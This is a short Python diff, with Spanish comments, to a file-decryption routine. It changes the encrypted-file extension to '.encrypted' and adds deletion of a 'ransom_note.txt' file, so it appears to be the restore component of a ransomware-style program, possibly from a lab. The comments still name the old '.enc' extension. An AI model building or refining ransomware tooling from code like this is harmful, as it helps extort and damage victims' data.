@@ -74,17 +74,20 @@ def descifrar_archivos():
 
     # Descifra los archivos con extensión '.enc'
     for archivo in archivos:
-        if archivo.endswith(".enc"):  # Verifica si el archivo tiene la extensión '.enc'
+        if archivo.endswith(".encrypted"):  # Verifica si el archivo tiene la extensión '.enc'
             ruta_completa = os.path.join(directorio_base, archivo)
             if os.path.isfile(ruta_completa):
                 # Descifra el archivo
                 descifrar_archivo(ruta_completa, clave_aes)
                 # Renombrar el archivo eliminando la extensión '.enc'
-                nueva_ruta = ruta_completa[:-4]  # Elimina la extensión '.enc'
+                nueva_ruta = ruta_completa[:-10]  # Elimina la extensión '.enc'
                 os.rename(ruta_completa, nueva_ruta)
                 print(f"Archivo descifrado y renombrado: {ruta_completa} -> {nueva_ruta}")
 
     print("Archivos descifrados correctamente.")
+    ruta_reporte = os.path.join(directorio_base, "ransom_note.txt")
+    if os.path.exists(ruta_reporte):
+        os.remove(ruta_reporte)
 
 if __name__ == "__main__":
     descifrar_archivos()
